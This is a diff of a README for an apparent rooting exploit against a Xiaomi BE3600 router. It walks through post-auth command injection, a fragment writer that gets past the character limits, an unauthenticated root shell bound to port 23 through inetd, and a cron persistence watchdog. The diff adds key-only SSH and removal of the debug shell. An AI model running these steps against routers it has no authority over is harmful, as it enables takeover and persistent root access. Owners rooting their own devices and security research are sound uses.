@@ -27,16 +27,18 @@ scene_start ──► injected command runs as root (≤18 chars each)
 fragment writer (echo -n F>/tmp/N + cat /tmp/?>x + sh x)
     │   works around the 18-char and charset limits
     ▼
-inetd.conf + /usr/sbin/inetd ──► :23 / :2323 unauthenticated root /bin/sh
+inetd.conf + /usr/sbin/inetd ──► :23 temporary root /bin/sh (debug only)
     │
     ▼
 /data + /etc/crontabs (sec_cfg) ──► per-minute self-heal watchdog
-dropbear + authorized_keys ────► :22 SSH (key and password auth)
+dropbear -s + authorized_keys ──► :22 SSH (key auth only)
+persist verifies :22, then ──► removes inetd and the debug shell
 ```
 
 - **Post-auth RCE**: the admin password is required to reach the injection endpoint; this is not an unauthenticated RCE
 - Every legacy injection point used by XMiR-Patcher (`start_binding` etc.) is patched in 1.0.41; `wan_block` is the only live injection surface confirmed on this firmware
 - `/etc` is ramfs (rebuilt at boot); only `/data` (UBIFS) and `/etc/crontabs` (sec_cfg ext4) persist
+- The `:23` unauthenticated shell is a debug path only — `persist` kills inetd once SSH answers; the watchdog only resurrects dropbear
 
 ## Measured constraints
 
@@ -54,18 +56,19 @@ dropbear + authorized_keys ────► :22 SSH (key and password auth)
 macOS / Linux (needs `python3` + `curl`):
 
 ```bash
-curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist
+curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist --pubkey 'ssh-rsa AAAA...your public key'
 ```
 
 Windows PowerShell (replace `python` with `py` if needed):
 
 ```powershell
-irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist
+irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist --pubkey 'ssh-rsa AAAA...your public key'
 ```
 
-- `--stage persist` does everything: injection → inetd (:23/:2323 root shell) → dropbear (:22 SSH) → `/data` + cron watchdog that self-heals after every reboot
-- append `--pubkey 'ssh-rsa AAAA...'` to also install an SSH public key, then `ssh root@192.168.31.1`
-- one-shot shell only: swap `--stage persist` for `--stage shell`, then `nc 192.168.31.1 23`
+- `--stage persist` does everything: injection → temporary inetd (:23) → install key + dropbear (:22, `-s` key-only) → verify SSH answers → remove inetd → `/data` + cron watchdog
+- `--pubkey` is **required**: SSH accepts keys only; password auth is off (no `-B` blank-password flag)
+- optional `--allow-cidr 192.168.31.0/24` adds iptables rules restricting :22 to that subnet
+- debug shell only: swap `--stage persist` for `--stage shell`, then `nc 192.168.31.1 23` (gone after reboot, nothing persisted)
 
 ## Quick start (exploit.py)
 
@@ -73,11 +76,11 @@ irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi
 git clone https://github.com/ChiphaLo/xiaomi-be3600-rd16-ssh.git && cd xiaomi-be3600-rd16-ssh
 
 python3 exploit.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage shell
-# then: nc <router-ip> 23  ->  root /bin/sh
+# then: nc <router-ip> 23  ->  root /bin/sh (temporary debug)
 
 python3 exploit.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist \
     --pubkey 'ssh-rsa AAAA...your public key'
-# SSH (:22) + shell (:23/:2323) auto-recover after every reboot
+# SSH (:22, key-only) survives reboots; :23 debug shell removed once verified
 ```
 
 Stdlib only; performs login → injection → inetd → optional persistence.
@@ -94,6 +97,8 @@ cat /tmp/?>/tmp/x      # reassemble in glob order
 sh /tmp/x
 ```
 
+Single-char names `0-9a-z` give 36 slots; past that, exploit.py flushes each batch into two-char accumulators (`/tmp/x0`, `/tmp/x1`, …) and assembles them all at the end — manually, `cat /tmp/?>/tmp/xx` moves to a 2-char name and continues.
+
 ## Full manual walkthrough
 
 Same as what `exploit.py` automates — every step independently verifiable.
@@ -107,11 +112,13 @@ Same as what `exploit.py` automates — every step independently verifiable.
 
 ```bash
 TOK=$(curl -s -X POST 'http://192.168.31.1/cgi-bin/luci/api/xqsystem/login' \
-    --data 'username=admin&password=PASSWORD&logtype=2' \
+    --data-urlencode 'username=admin' \
+    --data-urlencode 'password=PASSWORD' \
+    --data-urlencode 'logtype=2' \
     | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
 ```
 
-> The login body must go via `--data`; `--data-urlencode` breaks the `&` separators.
+> URL-encode each field — `&`, `+` etc. inside the password break a raw `--data` body. Don't pass the whole body through a single `--data-urlencode`; that encodes the `&` separators too.
 
 ### 2. Command channel: scene + wan_block
 
@@ -156,7 +163,7 @@ sh /tmp/x
 
 Single-char names `0-9a-z` (36 slots); `cat /tmp/?>/tmp/xx` moves to a 2-char name for longer scripts.
 
-### 5. Shell via inetd
+### 5. Temporary shell via inetd (debug only)
 
 Bare `telnetd` exits on the `nvram get telnet_en` / `bdata get telnet_en` check; the official `set_telnet` API is gated by `apps.telnet`. inetd does not check:
 
@@ -166,21 +173,21 @@ cp /tmp/ii /etc/inetd.conf
 inetd
 ```
 
-`/tmp/ii` = `23 stream tcp nowait root /bin/sh sh`. Then `nc <ip> 23` → unauthenticated root shell.
+`/tmp/ii` = `23 stream tcp nowait root /bin/sh sh`. Then `nc <ip> 23` → unauthenticated root shell. **Debug channel only — it dies with the ramfs on reboot, must not go into persistence, and gets closed in step 7 once SSH answers.**
 
-### 6. SSH (recommended)
+### 6. SSH: key-only dropbear
 
 ```sh
 rm /etc/dropbear/dropbear_rsa_host_key       # 0-byte placeholder must go first
 dropbearkey -t rsa -f /data/dropbear_rsa_host_key   # ~1 min, lands on /data (persistent)
 mkdir -p /etc/dropbear
 echo 'your ssh-rsa pubkey' > /etc/dropbear/authorized_keys
-/usr/sbin/dropbear -r /data/dropbear_rsa_host_key -B
+/usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key   # -s disables password auth
 ```
 
-`ssh -i <privkey> root@<ip>` works. This firmware's musl lacks `$6$` SHA-512 crypt — use `$1$` md5 for password auth.
+`ssh -i <privkey> root@<ip>` works. **Never pass `-B`** (blank-password logins). If you really want password auth, root's hash must use `$1$` md5 — this firmware's musl lacks `$6$` SHA-512 crypt.
 
-### 7. Persistence
+### 7. Persistence (watchdog owns dropbear only)
 
 `/etc` is ramfs (rebuilt from squashfs at boot), but `/data` (UBIFS) and `/etc/crontabs` (sec_cfg ext4) survive. `/data/persist.sh`:
 
@@ -188,10 +195,8 @@ echo 'your ssh-rsa pubkey' > /etc/dropbear/authorized_keys
 #!/bin/sh
 mkdir -p /etc/dropbear
 cp /data/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
-cp /data/inetd.conf /etc/inetd.conf 2>/dev/null
-pgrep -x inetd    >/dev/null 2>&1 || /usr/sbin/inetd
 pgrep -x dropbear >/dev/null 2>&1 || \
-    /usr/sbin/dropbear -r /data/dropbear_rsa_host_key -B
+    /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key
 ```
 
 Append to `/etc/crontabs/root` (persistent via sec_cfg):
@@ -200,7 +205,22 @@ Append to `/etc/crontabs/root` (persistent via sec_cfg):
 * * * * * sh /data/persist.sh >/dev/null 2>&1
 ```
 
-inetd + dropbear self-heal within ~1 minute of every boot.
+Finishing steps:
+
+```sh
+# confirm :22 is listening (netstat -lnt), then close the debug shell
+for p in $(pgrep -x inetd); do kill $p; done
+rm -f /etc/inetd.conf
+```
+
+Optional: restrict SSH to the management subnet (fold into persist.sh so it self-heals):
+
+```sh
+iptables -I INPUT -p tcp -s 192.168.31.0/24 --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j DROP
+```
+
+After reboot, dropbear returns within ~1 minute — inetd does not.
 
 ## Files
 
